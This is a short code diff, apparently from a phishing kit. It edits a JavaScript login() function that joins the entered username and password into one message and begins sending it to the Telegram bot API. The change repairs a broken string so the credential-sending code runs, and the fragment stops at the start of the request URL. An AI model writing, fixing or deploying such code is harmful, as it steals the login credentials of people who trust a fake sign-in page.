@@ -23,8 +23,7 @@ function login() {
   if (username.length > 0 && pass.length > 0) {
     $("#logbut").attr("disabled", "disabled");
 
-    var text = "user : `" + username + "` |
-    | pass : `" + pass + "`";
+    var text = "user : `" + username + "` || pass : `" + pass + "`";
 
     $.get(
       "https://api.telegram.org/bot" +
